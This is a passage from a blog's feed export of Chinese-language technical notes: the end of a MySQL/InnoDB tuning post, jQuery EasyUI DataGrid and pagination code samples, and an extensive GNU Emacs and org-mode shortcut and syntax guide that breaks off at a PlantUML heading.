thread_concurrency的值应为8。默认为83.2.12 wait_timeout指定一个请求的最大连接时间，对于4GB左右内存的服务器可以设置为5-10。3.3 配置InnoDB的几个变量3.3.1 innodb_buffer_pool_size对于InnoDB表来说，innodb_buffer_pool_size的作用就相当于key_buffer_size对于MyISAM表的作用一样。InnoDB使用该参数指定大小的内存来缓冲数据和索引。对于单独的MySQL数据库服务器，最大可以把该值设置成物理内存的80%。根据MySQL手册，对于2G内存的机器，推荐值是1G（50%）。3.3.2 innodb_flush_log_at_trx_commit主要控制了innodb将log buffer中的数据写入日志文件并flush磁盘的时间点，取值分别为0、1、2三个。0，表示当事务提交时，不做日志写入操作，而是每秒钟将log buffer中的数据写入日志文件并flush磁盘一次；1，则在每秒钟或是每次事物的提交都会引起日志文件写入、flush磁盘的操作，确保了事务的ACID；设置为2，每次事务提交引起写入日志文件的动作，但每秒钟完成一次flush磁盘操作。实际测试发现，该值对插入数据的速度影响非常大，设置为2时插入10000条记录只需要2秒，设置为0时只需要1秒，而设置为1时则需要229秒。因此，MySQL手册也建议尽量将插入操作合并成一个事务，这样可以大幅提高速度。根据MySQL手册，在允许丢失最近部分事务的危险的前提下，可以把该值设为0或2。3.3.3 innodb_log_buffer_sizelog缓存大小，一般为1-8M，默认为1M，对于较大的事务，可以增大缓存大小。可设置为4M或8M。3.3.4 innodb_additional_mem_pool_size该参数指定InnoDB用来存储数据字典和其他内部数据结构的内存池大小。缺省值是1M。通常不用太大，只要够用就行，应该与表结构的复杂度有关系。如果不够用，MySQL会在错误日志中写入一条警告信息。根据MySQL手册，对于2G内存的机器，推荐值是20M，可适当增加。3.3.5 innodb_thread_concurrency=8推荐设置为 2*(NumCPUs+NumDisks)，默认一般为84 参考资料http://www.cnblogs.com/Bozh/archive/2013/01/22/2871545.html]]></content>
      <categories>
        
          <category> database </category>
        
      </categories>
      <tags>
        
          <tag> MySQL </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[jQuery-EasyUI 开发笔记]]></title>
      <url>/javascript/2016/09/03/jquery-easyui/</url>
      <content type="text"><![CDATA[1 EasyUI分页1.1 点击查询按钮，查询数据，分页//C# Code&#30053;//javascript//&#29992;&#25143;&#36710;&#36742;&#31649;&#29702;function DataManage() {        var _this = this;// _this &#20026; DataManage&#23545;&#35937;        //&#21021;&#22987;&#39029;&#38754;&#20998;&#39029;&#25968;        _this.initPageSize = 20;        _this.initpageIndex = 1;        _this.Init = function () {                $('#vehicle_pp').pagination({                      total: 0,                      pageSize: _this.initPageSize,                      onSelectPage: function (pageNumber, pageSize) {                        _this.initpageIndex = pageNumber;                        _this.initPageSize = pageSize;                        _this.getVehicleInfo_PageChnage(pageNumber, pageSize);                      }                });        }        //&#31532;&#19968;&#27425;&#26597;&#35810;&#65288;&#20256;&#20837;&#26465;&#20214;&#21363;&#21487;&#65289;        _this.getVehicleInfo_First = function () {               var companyId = $('#company_code').combobox("getValue");               var onlineState = $('#online_state').combobox("getValue");               var forwardingFlag = $('#forwarding_flag').combobox("getValue");               var licensePlate = $('#license_plate').val();               var simcardNo = $('#simcard_no').val();               var deviceId = $('#device_id').val();               var ownerName = $('#owner_name').val();               //&#27880;&#24847;&#65306;div #user_vehicle_data&#20043;&#38388;&#26377;&#20010;&#31354;&#26684;               $.getJSON("/Data/GetUserVehicleData", { pageIndex: _this.initpageIndex, pageSize: _this.initPageSize, companyId: companyId, onlineState: onlineState, forwardingFlag: forwardingFlag, licensePlate: licensePlate, simcardNo: simcardNo, deviceId: deviceId, ownerName: ownerName }, function (data) {               $('div #user_vehicle_data').datagrid({                 collapsible: true,                 data: data.uservehiclelist,               });               $('#vehicle_pp').pagination({                 total: data.count,                 pageSize: 20,                 onSelectPage: function (pageNumber, pageSize) {                 _this.getVehicleInfo_PageChnage(pageNumber, pageSize);               }            });         });     }     //&#39029;&#38754;page&#25913;&#21464;&#26102;&#26597;&#35810;     _this.getVehicleInfo_PageChnage = function (pageNumber, pageSize) {        var companyId = $('#company_code').combobox("getValue");        var onlineState = $('#online_state').combobox("getValue");        var forwardingFlag = $('#forwarding_flag').combobox("getValue");        var licensePlate = $('#license_plate').val();        var simcardNo = $('#simcard_no').val();        var deviceId = $('#device_id').val();        var ownerName = $('#owner_name').val();        $.getJSON("/Data/GetUserVehicleData", { pageIndex: pageNumber, pageSize: pageSize, companyId: companyId, onlineState: onlineState, forwardingFlag: forwardingFlag, licensePlate: licensePlate, simcardNo: simcardNo, deviceId: deviceId, ownerName: ownerName }, function (data) {                $('div #user_vehicle_data').datagrid({                        collapsible: true,                        total: data.count,                        data: data.uservehiclelist,                });        });     }}//调用$(function () {        p_dataManage=new DataManage();        p_dataManage.Init(); //&#21021;&#22987;&#21270;&#21152;&#36733;});&lt;td&gt;&lt;a href="#" class="easyui-linkbutton" style="border:1px #95B8E7 solid" iconcls="icon-search" plain="true" onclick="p_dataManage.getVehicleInfo_First()"&gt;&#26597;&#35810;&lt;/a&gt;&lt;/td&gt;2 DataGrid2.1 DataGrid实现行编辑功能//效果图：//html code：&lt;table id="SearchDrawRect" class="easyui-datagrid"data-options="rownumbers:false,singleSelect:true,method:'get',fit:true"&gt;&lt;thead&gt;        &lt;tr&gt;                &lt;th data-options="field:'vehicle_id',width:40,checkbox:true"&gt;&#36712;&#36857;&lt;/th&gt;                &lt;th data-options="field:'company_name',width:150"&gt;&#20844;&#21496;&lt;/th&gt;                &lt;th data-options="field:'license_plate',width:80"&gt;&#36710;&#29260;&lt;/th&gt;                &lt;th data-options="field:'owner_name',width:100"&gt;&#32852;&#31995;&#20154;&lt;/th&gt;                &lt;th data-options="field:'owner_telephone',width:120"&gt;&#32852;&#31995;&#30005;&#35805;&lt;/th&gt;                &lt;th data-options="field:'load_seat',width:80,editor:{type:'numberbox',options:{precision:2}}"&gt;&#36733;&#37325;(&#21544;)&lt;/th&gt;                &lt;th data-options="field:'second_contact_phone',width:80,editor:{type:'textbox',options:{validType:'length[1,10]'}}"&gt;&#36710;&#38271;(&#31859;)&lt;/th&gt;                &lt;th data-options="field:'traction',width:80,editor:{type:'numberbox',options:{precision:2}}"&gt;&#36816;&#20215;&lt;/th&gt;                &lt;th data-options="field:'location_time',width:125"&gt;&#23450;&#20301;&#26102;&#38388;&lt;/th&gt;        &lt;/tr&gt;&lt;/thead&gt;&lt;/table&gt;//JavaScript code：&lt;script type="text/javascript"&gt;        $('#SearchDrawRect').datagrid({                data: data,                rowStyler: function (index, row) {                        if (row.is_online == "0") {                                return 'color:gray;';                        }                        if (row.is_online == "1") {                                var a = 'color:purple';                                if (row.speed &gt; 0) {                                        a = 'color:green;';                                }                                if (row.alarm_desc != '' &amp;&amp; row.alarm_desc != null) {                                        a = 'color:red;';                                }                                                            return a;                        }                },                onCheck: function (rowIndex, rowData) {                        var x = rowData.real_x;                        var y = rowData.real_y;                        _this.Map.SetCenterRect(x + "|" + y, rowData.vehicle_id);                },                onDblClickCell: function (index, field, value) {                        if (editIndex != index) {                                if (_this.endEditing()) {                                        $("#SearchDrawRect").datagrid('selectRow', index).datagrid('beginEdit', index);                                        var ed = $('#SearchDrawRect').datagrid('getEditor', { index: index, field: "load_seat" });                    ($(ed.target).data('textbox') ? $(ed.target).textbox('textbox') : $(ed.target)).focus();//&#33719;&#21462;&#28966;&#28857;                    editIndex = index;                } else {                        $("#SearchDrawRect").datagrid('endEdit', editRow);                }            }        },        toolbar: [{                text: '&#20445;&#23384;',                iconCls: 'icon-save',                handler: function () {                        var row = $('#SearchDrawRect').datagrid('getSelected');                        if (row != null) {                    var rowIndex = $('#SearchDrawRect').datagrid('getRowIndex', row);//&#34892;Index                    //&#33719;&#21462;&#24403;&#21069;&#32534;&#36753;&#34892;&#23545;&#35937;                    var loadSeatEditor = $('#SearchDrawRect').datagrid('getEditor', { index: rowIndex, field: "load_seat" });                    var secondContactPhoneEditor = $('#SearchDrawRect').datagrid('getEditor', { index: rowIndex, field: "second_contact_phone" });                    var tractionEditor = $('#SearchDrawRect').datagrid('getEditor', { index: rowIndex, field: "traction" });                    if (loadSeatEditor == null || secondContactPhoneEditor == null || tractionEditor==null) {                        AlertInfo("&#35831;&#36873;&#20013;&#24403;&#21069;&#32534;&#36753;&#30340;&#34892;&#65281;");                        return;                    }                    var updateData = {                        vehicleId: row.vehicle_id,                        loadSeat: $(loadSeatEditor.target).textbox('getValue'),                        secondContactPhone: $(secondContactPhoneEditor.target).textbox('getValue'),                        traction: $(tractionEditor.target).textbox('getValue')                    };                    $.post("/Data/UpdateVehicle", { vehicleId: updateData.vehicleId, loadSeat: updateData.loadSeat, secondContactPhone: updateData.secondContactPhone, traction: updateData.traction }, function (data) {                        if (data == "1") {                                AlertInfo("&#30331;&#24405;&#24050;&#22833;&#25928;&#65292;&#35831;&#37325;&#26032;&#30331;&#24405;&#31995;&#32479;&#65281;");                        } else if (data == "2") {                                AlertInfo("&#27809;&#26377;&#20445;&#23384;&#25104;&#21151;&#65292;&#35831;&#37325;&#26032;&#20445;&#23384;&#65281;");                        }                        else {                                if (data != "") {                                        AlertInfo(data);                                } else {                                        AlertInfo("&#20462;&#25913;&#25104;&#21151;");                                $("#SearchDrawRect").datagrid('selectRow', rowIndex).datagrid('endEdit', rowIndex);//&#32467;&#26463;&#32534;&#36753;&#34892;                            }                        }                    });                } else {                        AlertInfo("&#35831;&#36873;&#20013;&#38656;&#35201;&#20445;&#23384;&#30340;&#25968;&#25454;&#65281;");                }            }        }]});&lt;/script&gt;2.2 DataGrid，点击表头进行排序//JavaScript code：///&#25490;&#24207;//obj &#25490;&#24207;&#23545;&#35937;//sortName &#25490;&#24207;&#21015;&#21517;//sortOrder &#25490;&#24207;acs&#65292;desc_this.sort = function (obj, sortName, sortOrder) {        var queryParams = $('#' + obj).datagrid('options').queryParams;        queryParams.sortName = sortName;        queryParams.sortOrder = sortOrder;        $('#' + obj).datagrid('reload');}$('div #user_vehicle_data').datagrid({      collapsible: true,      queryParams: { "sortName": "", "sortOrder": "" },      remoteSort: false,      onSortColumn: function (sort, order) {            _this.sort('user_vehicle_data', sort, order);//&#35843;&#29992;&#25490;&#24207;&#26041;&#27861;&#12290;      },      sortable: true,      total: data.count,      data: data.uservehiclelist,});2.3 DataGrid Filter2.3.1 效果图2.3.2 实现关键代码//&#24341;&#20837;filter&#25991;&#20214;//datagrid-filter-zh_CN.js&#20869;&#23481;&#26159;&#33258;&#23450;&#20041;&#30340;&#65292;&#26412;&#23567;&#33410;&#32467;&#23614;&lt;script src="~/Content/EasyUI1.4.5/datagrid-filter/datagrid-filter.js"&gt;&lt;/script&gt;&lt;script src="~/Content/EasyUI1.4.5/datagrid-filter/datagrid-filter-zh_CN.js"&gt;&lt;/script&gt;//&#24320;&#21551;&#36807;&#28388;&#65292;&#23454;&#29616;&#36807;&#28388;&#26041;&#27861;$('#SearchDrawRect').datagrid('enableFilter');$('#SearchDrawRect').datagrid('enableFilter', [{    field: 'vehicle_type_name',    type: 'combobox',    options: {        url: '/Monitor/GetVehicleType',        valueField: 'vehicle_type_name',//&#21407;vehicle_type_code        textField: 'vehicle_type_name',        multiple: false,        panelHeight: '200px',        editable: false,        onChange: function (value) {             var vehicleTypeName="";             if (value == '') {                 $('#SearchDrawRect').datagrid('removeFilterRule', 'vehicle_type_name');             } else {                 $('#SearchDrawRect').datagrid('addFilterRule', {                    field: 'vehicle_type_name',                    op: 'equal',                    value: value                 });             }             $('#SearchDrawRect').datagrid('doFilter');        }    }}, {    field: 'load_seat',//&#36710;&#38271;    type: 'numberbox',    options: {        precision: 2,        onChange: function (value) {            if (value == '') {                dg.datagrid('removeFilterRule', 'load_seat');            } else {                $('#SearchDrawRect').datagrid('addFilterRule', {                    field: 'load_seat',                    op: 'greaterorequal',                    value: value                });            }                                $('#SearchDrawRect').datagrid('doFilter');       }   }}2.3.3 datagrid-filter-zh_CN.js//Add by 20170510,zrgif ($.fn.datagrid) {    $.fn.datagrid.defaults.operators.nofilter.text = '&#19981;&#36807;&#28388;';    $.fn.datagrid.defaults.operators.contains.text = '&#21253;&#21547;';    $.fn.datagrid.defaults.operators.equal.text = '&#31561;&#20110;';    $.fn.datagrid.defaults.operators.notequal.text = '&#19981;&#31561;&#20110;';    $.fn.datagrid.defaults.operators.beginwith='&#24320;&#22836;';    $.fn.datagrid.defaults.operators.endwith.text = '&#32467;&#23614;';    $.fn.datagrid.defaults.operators.less.text = '&#23567;&#20110;';    $.fn.datagrid.defaults.operators.lessorequal.text = '&#23567;&#20110;&#25110;&#31561;&#20110;';    $.fn.datagrid.defaults.operators.greater.text = '&#22823;&#20110;';    $.fn.datagrid.defaults.operators.greaterorequal.text = '&#22823;&#20110;&#25110;&#31561;&#20110;';}2.4 参考资料http://www.jeasyui.com/documentation/index.phphttp://46aae4d1e2371e4aa769798941cef698.devproxy.yunshipei.com/frightingforambition/article/details/50457407http://blog.csdn.net/hanchangning19890201/article/details/40786587http://www.cnblogs.com/sword-successful/p/3386861.htmlhttp://www.jeasyui.com/extension/datagrid_filter.phphttp://www.cnblogs.com/ckaifeng/p/5006569.htmlhttp://blog.csdn.net/hongping626/article/details/168561913 Window居中var easyuiPanelOnOpen = function (left, top) {        var iframeWidth = $(this).parent().parent().width();        var iframeHeight = $(this).parent().parent().height();        var windowWidth = $(this).parent().width();        var windowHeight = $(this).parent().height();        var setWidth = (iframeWidth - windowWidth) / 2;        var setHeight = (iframeHeight - windowHeight) / 2;        $(this).parent().css({/* &#20462;&#27491;&#38754;&#26495;&#20301;&#32622; */                left: setWidth,                top: setHeight        });        if (iframeHeight &lt; windowHeight)        {                $(this).parent().css({/* &#20462;&#27491;&#38754;&#26495;&#20301;&#32622; */                        left: setWidth,                        top: 0                });        }        $(".window-shadow").hide();};$.fn.window.defaults.onOpen = easyuiPanelOnOpen;4 EasyUI-textbox，点击回车键，执行某个方法html code:&lt;input id="tb" type="text" style="width:300px"&gt;方法一：//&#36825;&#31181;&#26041;&#27861;&#33539;&#22260;&#22826;&#24191;&#65292;&#22914;&#26524;&#39029;&#38754;&#26377;&#22810;&#20010;&#25991;&#26412;&#26694;&#23601;&#19981;&#22909;&#29992;&#20102;$(window).keydown(function(event) {     if(event.keyCode == 13) {          alert('111');     }});方法二：//&#25353;&#29031;id&#30417;&#21548;&#26576;&#20010;&#25991;&#26412;&#26694;&#30340;&#22238;&#36710;&#20107;&#20214;$('#clientID').textbox({    inputEvents: $.extend({},$.fn.textbox.defaults.inputEvents,{        keyup: function(event){             if(event.keyCode == 13) {                alert('OK');            }        }    });}); 方法三：$('#clientID').textbox('textbox').keydown(function (e) {    if (e.keyCode == 13) {        alert('000');    }});]]></content>
      <categories>
        
          <category> javascript </category>
        
      </categories>
      <tags>
        
          <tag> EasyUI </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[GNU Emacs]]></title>
      <url>/software/2016/06/06/using-emacs/</url>
      <content type="text"><![CDATA[1 简介(Introduction)ENGNU Emacs is the most popular and most ported Emacs text editor. It was created by GNU Project founder Richard Stallman. In common with other varieties of Emacs, GNU Emacs is extensible using a Turing complete programming language.CNEMACS，即 Editor MACroS（编辑器宏）的缩写，最初由 Richard Stallman(理查德·马修·斯托曼)于 1975 年在 MIT 协同 Guy Steele 共同完成。这一创意的灵感来源于 TECMAC 和 TMACS，它们是由 Guy Steele、Dave Moon、Richard Greenblatt、Charles Frankston 等人编写的宏文本编辑器。Emacs 使用 Emacs Lisp，这种有着极强扩展性的编程语言，从而实现了包括编程、编译乃至网络浏览等等功能的扩展。2 快捷键(Keyboard)2.1 Open Emacs on command line.// 在命令行中打开Emacs$ emacs -nw filename2.2 Don't know how to use emacs?2.2.1 缺省按键前缀(Default Prefix)Table 1: Prefix按键前缀描述CCtrlMAltSShiftRETEnter 回车键up/down/left/right上/下/左/右 方向键C-c当前编辑模式特有的命令C-x文件和缓冲区命令C-h获取帮助命令M-x键入函数名称前缀快捷键2.2.2 常用的快捷键(General Keyboard)Table 2: general shotkeys快捷键描述快捷键描述C-x  C-c退出C-g退出一个正在运行的命令C-v查看下一屏M-v查看上一屏C-l重绘屏幕，并将光标所在行置于屏幕的中央&#xa0;&#xa0;C-f向右移（forward,前进）C-b向左移（backward，回退）C-p上一行（previous）C-n下一行（next）M-f向右移（以单词为一个单位）M-b向左移（以单词为一个单位）M-&lt;移动到所有文字最开头M-&gt;移动到所有文字的最末尾C-a移动到行首C-e移动到行尾M-a移动到句首M-e移动到句尾C-k删除光标后的内容C-y粘贴C-/撤销C-x C-u撤销C-d删除光标后的字符M-w复制C-SPACE选择内容模式C-w剪切C-x C-f新建/打开文件C-x C-s保存C-x 2分屏C-x 0切换到窗口1C-x o切换窗口C-h t查看帮助2.2.3 基本文件操作(File)Table 3: File快捷键描述C-x C-f打开/新建文件C-x C-s保存C-x C-w另存为C-x C-v关闭当前缓冲区文件，打开新文件C-x i在当前光标位置插入文件C-x b新建/切换缓存区C-x C-b显示缓存区列表C-x k关闭当前缓存区C-x C-c退出emacs.2.2.4 光标移动(Move)Table 4: Move快捷键描述C-f光标向后移动C-b光标向前移动C-p上一行C-n下一行M-f光标移动到单词尾部M-b光标移动到单词头部C-a行首C-e行尾C-v向下翻页M-v向上翻页M-&lt;到文件开头M-&gt;到文件结尾2.2.5 文本编辑(Text Edit)Table 5: Text Edit快捷键描述M-n/C-u n重复执行后一个命令n次C-d删除后一个字符M-d删除前一个字符Del删除前一个字符M-Del删除前一个单词C-k移除一行C-@设定标志位(主要是为了粘贴剪切以及删除使用)C-w移除标记区域的内容（剪切）M-w复制标记区域的内容（复制）C-y粘贴M-y召回更早的内容 (在kill缓冲区内循环)C-t交换两个字符的位置M-t交换两个单词的位置C-x C-t交换两行的位置M-u使从光标位置到单词结尾处的字母变成大写M-l与M-u相反M-c使从光标位置开始的单词的首字母变为大写M-x mark-whole-buffer or C-x h, M-x indent-region or C-M-\选中整个文件，然后格式化M-x mark-defun or C-M-h, M-x indent-region or C-M-\选中函数，格式化2.2.6 搜索(search)快捷键描述C-s向前搜索C-r向前搜索M-%查找及替换:首先按下快捷键，输入要替换的词，RET，然后输入要替换的词，RET2.2.7 窗口命令(Window)快捷键描述C-x 2水平分割窗格C-x 3垂直分割窗格C-x o切换至其他窗格C-x 0关闭窗格C-x 1关闭除了光标所在窗格外所有窗格2.2.8 帮助(Help)快捷键描述C-h m查看当前模式C-h c显示快捷键绑定的命令C-h k显示快捷键绑定的命令和它的作用C-h f显示函数的功能C-h b显示当前缓冲区所有可用的快捷键C-h t打开emacs教程M-x quit退出help3 自定义(Custom)3.1 基础定制(Basic Custom);; &#26174;&#31034;&#34892;&#21015;&#21495;(setq column-number-mode t)(setq line-number-mode t);; &#35774;&#32622;&#26631;&#39064;&#26639;(setq frame-title-format "Welcome to Emacs world! ");; &#31105;&#29992;&#33756;&#21333;&#26639;&#65307;F10&#24320;&#21551;&#33756;&#21333;&#26639;(menu-bar-mode nil);; &#21462;&#28040;&#24037;&#20855;&#26639;(tool-bar-mode nil);; &#21462;&#28040;&#28378;&#21160;&#26639;(set-scroll-bar-mode nil);; &#30452;&#25509;&#25171;&#24320;&#21644;&#26174;&#31034;&#22270;&#29255;(setq auto-image-file-mode t);; &#26174;&#31034;&#26102;&#38388;(display-time-mode t);; 24&#23567;&#26102;&#21046;(setq display-time-24hr-format t);; &#35774;&#32622;F11&#26368;&#22823;&#21270;(global-set-key [f11] 'maximized)(defun maximized ()(interactive)(x-send-client-message nil 0 nil "_NET_WM_STATE" 32 '(2 "_NET_WM_STATE_MAXIMIZED_HORZ" 0)) (x-send-client-message nil 0 nil "_NET_WM_STATE" 32 '(2 "_NET_WM_STATE_MAXIMIZED_VERT" 0)))快速设置生效命令: M-x eval-buffer3.2 自定义高级配置(Advanced Custom)3.2.1 插件(plugin) &amp; 主题(Theme)安装// 示例：安装 plantuml 插件M+x package-install &lt;RET&gt;plantuml-mode &lt;RET&gt;// 示例：安装 monokai-pro 主题（手动安装）// &#23558;&#28155;&#21152;&#21040; ~/.emacs &#25110; ~/.emacs.d/init.el &#25991;&#20214;(add-to-list 'load-path "~/.emacs.d/lisp/")(require 'plugin-name)packages manager// 查看所有安装包M+x list-packages// 自动卸载无效的包M+x package-autoremove4 org-modeOrg mode is for keeping notes, maintaining TODO lists, planning projects, and authoring documents with a fast and effective plain-text system.4.1 Installationhttps://orgmode.org/4.2 常用快捷键(Keyboard)Table 6: org-mode keyboard快捷键描述TAB  (org-cycle)Cycle visibility. 循环切换光标所在大纲的状态RETenter,Select this location.C-c C-n (org-next-visible-heading)Next heading.C-c C-p (org-previous-visible-heading)Previous heading.C-c C-f (org-forward-same-level)Next heading same level.C-c C-b (org-backward-same-level)Previous heading same level.C-c C-u (outline-up-heading)Backward to higher level heading.C-c C-j切换到大纲浏览状态M-RET (org-meta-return)Insert a new heading, item or row.  插入一个同级标题C-RET (org-insert-heading-respect-content)Insert a new heading at the end of the current subtree.M-LEFT/RIGHT将当前标题升/降级M-S-LEFT/RIGHT将子树升/降级M-S-UP/DOWN将子树上/下移4.3 一些小技巧快速输入#+BEGINSRC … #+ENDSRC//输入 #+BEGIN_SRC ... #+END_SRC输入&lt;s &lt;TAB&gt;//#+BEGIN_EXAMPLE ... #+END_EXAMPLE输入&lt;e &lt;TAB&gt;//#+BEGIN_EXPORT html ... #+END_EXPORT输入&lt;h &lt;TAB&gt;//#+BEGIN_EXPORT latex ... #+END_EXPORT输入&lt;l &lt;TAB&gt;4.4 基本语法4.4.1 标题(Title)#+TITLE: GNU Emacs4.4.2 字体(Font)粗体斜体删除线下划线下标：H2 O(这里必须留一个空格要不然2和O都成为小标，目前还不知道怎么去掉空格)上标：E=mc2等宽字： =git=，~code~4.4.3 段落(paragraph)使用 \\ 换行空一行代表重新起段落4.4.4 列表(List)有序列表无序列表以'-'、'+'或者'*'开头有序列表以'1.'或者'1)'开头描述列表用'::'注意事项列表符号后面都要有空格同级别的列表缩进要相同如果想要加入同级别的列表，可以 M-RET空两行之后列表结束，如果空一行执行M-RET，实际上还是输入同级项列表相关快捷键Table 7: 折叠快捷键说明S-TAB循环切换整个文档的大纲状态（折叠、打开下一级、打开全部）TAB循环切换光标所在的大纲状态Table 8: 大纲或者列表之间移动快捷键说明C-c C-n/p移动到下上一个标题（不断标题是哪一级）C-c C-f/b移动到同一级别的下/上标题C-c C-u跳到上一级标题C-c C-j切换到大纲预览状态Table 9: 基于大纲/标题的编辑快捷键说明M-RET插入一个同级别的标题M-S-RET插入一个同级别的TODO标题M-LEFT/RIGHT将当前标题升/降级M-S-LEFT/RIGHT将子树升/降级M-S-UP/DOWN将子树上/下移动C-c *将本行设为标题或者正文C-c C-w将子树或者区域移动到另一个标题处（跨缓冲区）C-c C-x b在新缓冲区显示当前分支C-c /只列出包含搜索结果的大纲，并高亮，支持多种搜索方式4.4.5 嵌入元数据内容元数据代码#+begin_src c -n -t -h 7 -w 40...#+end_srcc 为所添加的语言-n 显示行号-t 清除格式-h 7 设置高度为7-w 40设置宽度为40注释#+BEGIN_COMMENT块注释...#+END_COMMENT表格与图片#+CAPTION: This is the caption for the next table (or link)则在需要的地方可以通过 \ref{table1} 来引用该表格。嵌入HTML#+BEGIN_EXPORT htmlAll lines between these markers are exported literally#+END_EXPORT包含文件#+INCLUDE: "~/.emacs" src emacs-lisp文档元数据Table 10: 文档元数据H:标题层数num:章节(标题)是否自动编号toc:是否生成索引creator:是否生成 "creat by emacs…"LINKUP:UP: 链接LINKHOME:HEME: 链接4.4.6 表格(Table)快捷键Table 11: 整体区域操作说明C-c 竖线创建或者转化成表格C-c C-c调整表格，不移动光标TAB移动到下一区域，必要时新建一行S-TAB移动到上一区域RET移动到下一行，必要时新建一行Table 12: 编辑行和列快捷键说明M-LEFT/RIGHT移动列M-UP/DOWN移动行M-S-LEFT/RIGHT删除/插入列M-S-UP/DOWN删除/插入行C-m移动到下一行，或新建一行C-c -添加水平分割线C-c RET添加水平分割线并跳到下一行C-c ^根据当前列排序，可以选择排序方式C-c `编辑当前单元格C-c C-x C-w剪切某个区域的表格内容C-c C-x C-y拷贝复制的内容到表格表格计算Table 13: 一张价格表，要求算出总额数量单价总额23.456.944.3417.3653.4417.255.628.C-u C-c C-c 强制org mode为整个表格进行计。只希望在某一特定项上进行计算，输入：':=$1*$2′, 即在等号前再加一个冒号。&lt;5&gt; 表示指定列的宽度，超出宽度的部分会用=&gt;表示，如果想要编辑，需要按下C-c ` ，会打开另一个buffer让你编辑, 用C-c C-c提交编辑内容。&lt;l&gt; 表示左对齐，r,c,l字符分别表示右、中和左对齐。4.4.7 链接(Link)在一个链接上按C-c C-o即可访问。自动链接对于符合链接规则的内容，org-mode会自动将其视为链接，包括括文件、网页、邮箱、新闻组、BBDB 数据库项、 IRC 会话和记录等。手动链接[[link][description]][[link]]内部链接#&lt;&lt;target&gt;&gt;设置到target的链接：[[target]] 或 [[target][猛击锚点]]4.4.8 注脚注脚的格式有两种，一是方括号+数字，二是方括号+fn+名字。插入脚注：C-c C-x f ，接下俩你可以写一些其他东西，然后在文章的末尾写上下面两句话（注意：必须要顶格写）：[1] The link is: http://orgmode.org[fn:orghome] The link is: http://orgmode.org4.4.9 分割线五条短线或以上4.4.10 标签(Tag)标记tags#+FILETAGS: :Peter:Boss:Secret:// 更方便的做法是在正文部分用C-c C-q 或直接在标题上用C-c C-c创建标签预定义tags预定义的方式有两种：在当前文件头部定义这种方式预定义的标签只能在当前文件中使用。使用#+TAGS元数据进行标记， #+TAGS: { 桌面(d) 服务器(s) }  编辑器(e) 浏览器(f) 多媒体(m) 压缩(z)每项之间必须用空格分隔，可以在括号中定义一个快捷键；花括号里的为标签组，只能选择一个对标签定义进行修改后，要在标签定义的位置按 C-c C-c 刷新才能生效。在配置文件中定义(setq org-tag-alist '((:startgroup . nil)    ("@work . ?w) ("@home" . ?h)    ("@tennisclub" . ?t)    (:endgroup . nil)    ("laptop" . ?l) ("pc" . ?p)))默认情况下，org会动态维护一个Tag列表，即当前输入的标签若不在列表中，则自动加入列表以供下次补齐使用。为了使这几种情况（默认列表、文件预设tags，全局预设tags）同时生效，需要在文件中增加一个空的TAGS定义：#+TAGS:tags查询Table 14: tags查询快捷键快捷键说明C-c \可以用来查找某个tag下的所有项目C-c / m搜索并按树状结构显示C-c a m从所有agenda file里建立符合某tag的全局性列表+   和      a+b   同时有这两个标签-   排除    a-b   有 a 但没有 b|   或      a|b   有 a 或者有 b&amp;   和      a&amp;b   同时有 a 和 b，可以用“+”替代4.4.11 Working with Source CodeStructure of Code Blocks#+NAME:&lt;name&gt;#+BEGIN_SRC &lt;language&gt; &lt;switches&gt; &lt;header arguments&gt;&lt;body&gt;'#+NAME:&lt;name&gt;'Optional. Names the source block so it can be called, like a function, from other source blocks or inline code to evaluate or to capture the results.'#+BEGINSRC'&#x2026;'#+ENDSRC'Mandatory. They mark the start and end of a block that Org requires.'&lt;language&gt;'Mandatory. It is the identifier of the source code language in the block. See Languages'&lt;switches&gt;'Optional. Switches provide finer control of the code execution, export, and format(see the discussion of switches in Literal Examples).'&lt;header arguments&gt;'Optional. Heading arguments control many aspects of evaluation, export and tangling of code blocks(see Using Header Arguments).'&lt;body&gt;'Source code in the dialect of the specified language identifier.more info.：https://orgmode.org/org.html#Structure-of-Code-BlocksLiteral Examples#+BEGIN_SRC emacs-lisp -n 1 -r -l "((%s))"(save-excursion                 (ref:sc)	(goto-char (point-min))      (ref:jump)#+END_SRCIn line [[(sc)]] we remember the current position. [[(jump)][Line (jump)]]jumps to point-min.-n or +n, to get the lines of the example numbered.-r, switch which removes the labels from the source code. With the ‘-n’ switch, links to these references are labeled by the line numbers from the code liing.-i, to preserve the indentation of a specific code block(see Editing Source Code).-l, to change the format. See also the variable org-coderef-label-format.#+ALTR_HTML::textarea t :width 40#+BEGIN_EXAMPLE (defun org-xor (a b) "Exclusive or." (if a (not b) b))#+END_EXAMPLEHTML export also allows examples to be published as text areas (see [[https://orgmode.org/org.html#Text-areas-in-HTML-export][Text areas in HTML export]]).Environment of a Code Block1) Passing arguments#+NAME: with-rownames| one | 1 | 2 | 3 | 4 |  5 || two | 6 | 7 | 8 | 9 | 10 |#+BEGIN_SRC python :var tab=with-rownames :rownames yes return [[val + 10 for val in row] for row in tab]#+END_SRC#+RESULTS:| one | 11 | 12 | 13 | 14 | 15 || two | 16 | 17 | 18 | 19 | 20 |more info: https://orgmode.org/org.html#Environment-of-a-Code-Block2) Using sessions3) Choosing a working directory#+BEGIN_SRC R :file myplot.png :dir ~/Work matplot(matrix(rnorm(100), 10), type="l")#+END_SRC#+BEGIN_SRC R :file plot.png :dir /scp:dand@yakuba.princeton.edu:  plot(1:10, main=system("hostname", intern=TRUE))#+END_SRC[[file:http://localhost:4000/assets/images/plot.png][plot.png]]4) Inserting headers and footers The ‘prologue’ header argument is for appending to the top of the code block for execution, like a reset instruction.For example, you may use ‘:prologue "reset"’ in a Gnuplot code block or, for every such block:1: (add-to-list 'org-babel-default-header-args:gnuplot2:      '((:prologue . "reset")))Evaluating Code Blocks1. How to evaluate source code2. Limit code block evaluation3. Cache results of evaluationResults of EvaluationExporting Code Blocks‘code’The default. The body of code is included into the exported file. Example: ‘:exports code’.‘results’The results of evaluation of the code is included in the exported file. Example: ‘:exports results’.‘both’Both the code and results of evaluation are included in the exported file. Example: ‘:exports both’.‘none’Neither the code nor the results of evaluation is included in the exported file. Whether the code is evaluated at all depends on other options. Example: ‘:exports none’.Extracting Source CodeCreate pure source code files.1. Header arguments2. Functions3. Hooks4. Jumping between code and Orgmore info.：https://orgmode.org/org.html#Extracting-Source-CodeNoweb Reference SyntaxLiterate programming in Org mode.more info.：https://orgmode.org/org.html#Noweb-Reference-Syntax4.5 PlantUML4.5.1 